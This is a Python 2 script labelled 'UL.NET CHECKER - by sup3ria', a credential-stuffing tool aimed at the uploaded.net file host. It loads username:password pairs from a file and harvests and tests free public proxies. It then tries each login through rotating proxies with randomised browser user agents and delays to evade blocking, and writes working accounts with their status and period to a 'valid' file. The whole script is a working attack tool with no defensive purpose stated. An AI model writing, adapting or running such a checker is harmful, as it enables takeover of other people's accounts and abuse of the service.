# -*- coding: utf-8 -*-
import argparse
from timeit import default_timer as timer
import random
from random import shuffle

import gevent#apt-get install gevent or pip install gevent
from gevent.queue import *
import gevent.monkey
import requests #pip install requests
import cookielib
from bs4 import BeautifulSoup #pip install BeautifulSoup4
asci = '''
UL.NET CHECKER - by sup3ria
'''
print asci

parser = argparse.ArgumentParser(description='uploaded.net checker 2017')
parser.add_argument('-i','--input', help='input.txt', required=False,type=str,default="input.txt")
parser.add_argument('-o','--output', help='output.txt', required=False,type=str,default="ul_valid.txt")
parser.add_argument('-s','--sleep', help='Sleeping in between?', required=False,type=bool,default=True)

args = vars(parser.parse_args())
file_in  = args['input']
file_out = args['output']
sleeper = args['sleep']

x = [u'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36', 
u'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)',
u'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17', 
u'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1', 
u'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36', 
u'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36',
u'Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0',
u'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F',
u'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)',
u'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36']


def parse(html):
    try:
        soup = BeautifulSoup(str(html), "lxml")
        table = soup.find("table", { "class" : "data"})
        soup = BeautifulSoup(str(table), "lxml")
        data = soup.findAll("th")
        #id_nr = data[0].text.strip()
        status = data[1].text.strip()
        period = data[3].text.strip()
        #email = data[5].text.strip()
        return status,period
    except:
        pass

def sub_worker(task, ip_port):
    try:
        ua = random.choice(x)
        jar = cookielib.CookieJar()
        usr= task.split(':')[0]
        pwd = task.split(':')[1]
        
        prx = "http://"+ip_port
        proxies = {'http': prx}
        s = requests.Session()
        s.proxies.update(proxies)
        url = "http://uploaded.net/io/login"
        l = s.get(url, cookies=jar,headers={'User-Agent': ua,'Accept':'*/*'})
        data = {'id': usr, 'pw': pwd}
        r = s.post(url, data=data, cookies=jar,allow_redirects=True,headers={'User-Agent': ua,'Accept':'*/*'})
        if '{"err":"User and password do not match!"}' not in r.text:
            g = s.get("http://uploaded.net/me", cookies=jar,headers={'User-Agent': ua,'Accept':'*/*'})
            data = parse(g.content)
            return data
        else:
            return False
    except:
        pass

def get_proxies():
    r = requests.get('https://free-proxy-list.net/')
    soup = BeautifulSoup(str(r.text), "lxml")
    tr = soup.findAll("tr")[1:299]
    proxies = []
    for e in tr:
        soup = BeautifulSoup(str(e), "lxml")
        td = soup.findAll("td")
        proxies.append([s.text.strip() for s in td])
    return [(e[0]+":"+e[1]) for e in proxies]

def prox_check(ip_port):
	try:
		prx = "http://"+ip_port
		proxies = {'http': prx}
		s = requests.Session()
		s.proxies.update(proxies)
		r = s.get("http://api.ipify.org/?format=text", timeout=3)
		if r.text in prx:
			r = s.get("http://www.lagado.com/proxy-test", timeout=3)
			c = r.text.split('<b>Remote &nbsp; IP Address</b>')[1][:14].strip()
			if ip_port[:9] in c:
				return True
		return False
	except:
		return False
            
def prox_worker():
    while not q_prox.empty():
        y = q_prox.get()
        p = prox_check(y)
        if p:
            p = prox_check(y)
            if p:
                v_prox.append(y)
         
def worker(ip_port):
    while not q.empty():
        try:
            for i in range(4):
                gevent.sleep(random.uniform(0.501,0.2983))
                task = q.get()
                data = sub_worker(task, ip_port)
                try:
                    if data != False:
                            if data[1].encode('utf-8').strip() == '•••':
                                line = task+'|'+data[0].encode('utf-8').strip()
                            else:
                                line = task+'|'+data[0].encode('utf-8').strip() +'>'+data[1].encode('utf-8').strip()
                            with open(file_out, 'a') as f:
                                print True, line
                                v.append(line)
                                f.write(line+'\n')
                    else:
                        print False, task
                except:
                    q.put(task)
        finally:
            if sleeper:
                gevent.sleep(random.uniform(8.501,9.0983))

def loader():
    with open(file_in, "r") as text_file:
        for line in text_file:
            try:
                if len(line.strip()) > 1:
                    q.put(line.strip(), timeout=90)
            except:
                pass

def asynchronous_prox():
    p = get_proxies()
    [q_prox.put(e) for e in p]
    threads = []
    print "Checking",len(p),"proxies."
    for i in xrange(101):
        threads.append(gevent.spawn(prox_worker))
    gevent.joinall(threads,raise_error=True)
    print "Found", len(v_prox), "valid proxies."
    print "Predicting speed of", len(v_prox)*6, "accounts/min.\n"
    
def asynchronous():
    threads = []
    for i in v_prox:
        threads.append(gevent.spawn(worker, i))
    start = timer()
    try:
        gevent.joinall(threads,raise_error=True)
    except:
		pass
    end = timer()
    print "\nFound",len(v),"valid account(s)."
    print "\n\nTime passed: " + str(end - start)[:6]

gevent.monkey.patch_all()
v = []
v_prox = []
q_prox = gevent.queue.JoinableQueue()
q = gevent.queue.JoinableQueue()
asynchronous_prox()
gevent.spawn(loader).join()
asynchronous()
